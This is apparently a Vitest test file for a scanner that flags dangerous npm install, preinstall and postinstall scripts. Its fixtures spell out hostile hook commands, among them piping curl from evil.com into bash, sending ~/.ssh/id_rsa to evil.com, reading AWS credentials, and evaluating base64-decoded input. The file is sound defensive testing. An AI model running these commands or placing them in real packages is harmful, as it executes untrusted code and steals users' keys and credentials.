import { describe, it, expect } from 'vitest'
import { checkLifecycleScripts } from '../../src/checks/lifecycleScripts'
import type { RegistryPackument } from '../../src/utils/registry'

const target = (name: string) => ({ name })

function makePackument(scripts: Record<string, string>): RegistryPackument {
  return {
    name: 'test-pkg',
    'dist-tags': { latest: '1.0.0' },
    versions: {
      '1.0.0': { name: 'test-pkg', version: '1.0.0', scripts },
    },
    time: {},
  }
}

describe('checkLifecycleScripts', () => {
  it('returns no findings for a package with no lifecycle scripts', () => {
    const packument = makePackument({})
    expect(checkLifecycleScripts(target('clean-pkg'), packument)).toHaveLength(0)
  })

  it('returns no findings for safe lifecycle scripts', () => {
    const packument = makePackument({ postinstall: 'node scripts/build.js' })
    expect(checkLifecycleScripts(target('safe-pkg'), packument)).toHaveLength(0)
  })

  it('flags curl in postinstall as high', () => {
    const packument = makePackument({ postinstall: 'curl https://evil.com | bash' })
    const findings = checkLifecycleScripts(target('bad-pkg'), packument)
    expect(findings.some(f => f.level === 'high' && /curl/i.test(f.title))).toBe(true)
  })

  it('flags .ssh access as critical', () => {
    const packument = makePackument({ postinstall: 'cat ~/.ssh/id_rsa | curl -d @- https://evil.com' })
    const findings = checkLifecycleScripts(target('bad-pkg'), packument)
    expect(findings.some(f => f.level === 'critical' && /ssh/i.test(f.title))).toBe(true)
  })

  it('flags .aws access as critical', () => {
    const packument = makePackument({ install: 'cat ~/.aws/credentials' })
    const findings = checkLifecycleScripts(target('bad-pkg'), packument)
    expect(findings.some(f => f.level === 'critical' && /aws/i.test(f.title))).toBe(true)
  })

  it('flags eval as high', () => {
    const packument = makePackument({ preinstall: 'eval $(echo dGVzdA== | base64 -d)' })
    const findings = checkLifecycleScripts(target('obfuscated-pkg'), packument)
    expect(findings.some(f => f.level === 'high' && /eval/i.test(f.title))).toBe(true)
  })

  it('flags process.env access as medium', () => {
    const packument = makePackument({ postinstall: 'node -e "console.log(JSON.stringify(process.env))"' })
    const findings = checkLifecycleScripts(target('env-harvester'), packument)
    expect(findings.some(f => f.level === 'medium')).toBe(true)
  })

  it('deduplicates the same pattern across multiple hooks', () => {
    const packument = makePackument({
      preinstall: 'curl https://a.com',
      postinstall: 'curl https://b.com',
    })
    const findings = checkLifecycleScripts(target('bad-pkg'), packument)
    const curlFindings = findings.filter(f => /curl/i.test(f.title))
    expect(curlFindings).toHaveLength(1)
  })

  it('returns no findings when no dist-tags.latest', () => {
    const packument = { name: 'pkg', 'dist-tags': {}, versions: {}, time: {} } as any
    expect(checkLifecycleScripts(target('pkg'), packument)).toHaveLength(0)
  })
})
